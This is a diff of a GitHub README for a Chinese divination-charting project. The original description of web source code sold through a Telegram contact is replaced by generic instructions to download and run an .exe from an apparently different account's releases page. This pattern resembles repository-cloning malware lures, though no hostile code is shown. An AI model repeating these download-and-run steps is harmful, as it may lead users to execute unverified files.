@@ -1,12 +1,71 @@
-# I-Ching-Bagua-Divination-Layout-Source-Code
-周易源码，周易八卦排盘源码，國學術數玄學，五行八卦，四柱八字，大六壬，阴阳排盘，八字陰陽，奇門遁甲，紫微斗數，七政四余集大成者结合，数十位占卜师多年研究心得，通过网页展示出来；
-Traditional Chinese Metaphysical Systems including I Ching Bagua, Yin-Yang & Five Elements theory, GanZhi calendrics, BaZi Four Pillars charting, Zi Wei Dou Shu astrology, Qi Men Dun Jia divination, Qi Zheng Si Yu planetary analysis, Purple Star fortune interpretations, Xing-Chong relationship analysis, Shen Sha deity/malefic classifications, and related chart calculation methodologies.
-全套源码出；联系Telegram：@xuzongbin001； 邮箱：ttpoker733@gmail.com
+# 🌀 I-Ching-Bagua-Divination-Layout-Source-Code - Discover Ancient Wisdom Visually
 
-<img width="2471" height="1285" alt="屏幕截图 2025-03-15 113242" src="https://github.com/user-attachments/assets/7db50616-71ef-45e0-91cc-1cd05eea57ad" />
-<img width="2522" height="1364" alt="屏幕截图 2024-10-29 115350" src="https://github.com/user-attachments/assets/2c5e4687-3b4d-446e-a632-ad999638ec44" />
-<img width="2446" height="1292" alt="屏幕截图 2024-10-29 115251" src="https://github.com/user-attachments/assets/b4f96c7b-91cc-4718-aeab-f4752ee9aeb0" />
-<img width="2306" height="1369" alt="屏幕截图 2024-10-29 114720" src="https://github.com/user-attachments/assets/8a71e6fe-3ae2-4ebe-8d72-e3e6d3ffabad" />
-<img width="2484" height="1353" alt="屏幕截图 2024-10-29 114634" src="https://github.com/user-attachments/assets/fd2fac95-f22e-44ae-9be2-393a320216e8" />
-<img width="2540" height="1381" alt="屏幕截图 2024-10-29 114423" src="https://github.com/user-attachments/assets/6ba50da7-3873-4837-bb53-f671680fd22f" />
-<img width="2539" height="1369" alt="屏幕截图 2025-04-18 194842" src="https://github.com/user-attachments/assets/f94ca0b6-6160-488c-b02a-e1b3eb409047" />
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/releases)
+
+## 🚀 Getting Started
+
+Welcome to the I-Ching-Bagua-Divination-Layout-Source-Code! This application lets you explore the ancient wisdom of I-Ching and Bagua through a user-friendly web interface. Below, you'll find instructions to help you download and run the software easily.
+
+## 📥 Download & Install
+
+To get started, you need to visit this page to download the software: [Download Here](https://github.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/releases). You'll find the latest version ready for you.
+
+1. Click on the link above. 
+2. Find the latest release at the top of the page.
+3. Click on the version number to view release details.
+4. Look for the download link (it is typically labeled with a version number and may mention the file type).
+5. Click on the link to download the file to your computer.
+
+Make sure to remember where you saved the file so you can find it easily later.
+
+## 📂 System Requirements
+
+To run the I-Ching-Bagua application, your computer should meet the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 200 MB of free space
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge for optimal experience
+
+## 💻 Running the Application
+
+After downloading the file, follow these steps to run the application:
+
+1. Navigate to the folder where you saved the downloaded file.
+2. If you are using Windows, double-click on the .exe file. On macOS or Linux, you may need to open your terminal, navigate to the folder, and type `./yourfile` to run it.
+3. Follow the on-screen instructions to complete the setup process. 
+
+Once installed, you can start exploring the I-Ching and Bagua layouts right from your web browser.
+
+## 🧭 Features
+
+This application offers a range of features to enrich your experience:
+
+- **Visual Layouts:** View Bagua and I-Ching symbols beautifully displayed.
+- **Interactive Elements:** Click through different layouts to understand elements like Yin, Yang, and Five Elements.
+- **Multiple Insights:** Gain insights from various divination techniques, including Bazi and Qi Men Dun Jia.
+- **User-Friendly Interface:** Navigate easily even with no prior knowledge of these concepts.
+- **Community Input:** Benefit from insights gathered from experienced practitioners over many years.
+
+## 🔗 Explore More
+
+The I-Ching-Bagua-Divination-Layout-Source-Code combines the wisdom of various ancient disciplines. You can dive deeper into these topics:
+
+- **BaZi**
+- **Eight Trigrams (Bagua)**
+- **Heavenly Stems and Earthly Branches (Gan-Zhi)**
+- **Qi Men Dun Jia**
+- **Purple Star Fortune Analysis (Zi Wei Dou Shu)**
+
+Feel free to explore related concepts and enrich your understanding and practice.
+
+## 📧 Contact
+
+If you have any questions or need assistance, feel free to reach out at the following:
+
+- **Telegram:** [@xuzongbin001](https://t.me/xuzongbin001)
+- **Email:** ttpoker733@gmail.com
+
+Your feedback is valuable, and we encourage you to share your experiences using the application!
+
+Thank you for downloading I-Ching-Bagua-Divination-Layout-Source-Code. We hope this tool will support you in your journey of exploration and understanding of ancient wisdom!
